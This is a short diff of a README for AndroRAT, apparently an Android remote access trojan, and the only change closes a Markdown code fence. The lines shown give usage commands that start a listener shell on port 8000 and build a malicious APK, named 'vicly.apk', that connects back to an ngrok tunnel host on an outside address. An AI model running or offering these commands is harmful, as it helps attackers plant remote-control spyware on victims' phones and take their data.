@@ -135,7 +135,7 @@ In the sh shell there are some sub commands
 ```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
 
 * To build the apk using ngrok use this one:
-* ```python3 androRAT.py --build -i 4.tcp.ngrok.io -p 14527 -o vicly.apk
+* ```python3 androRAT.py --build -i 4.tcp.ngrok.io -p 14527 -o vicly.apk```
 
 ## Interpreter Examples
 * Generating APK
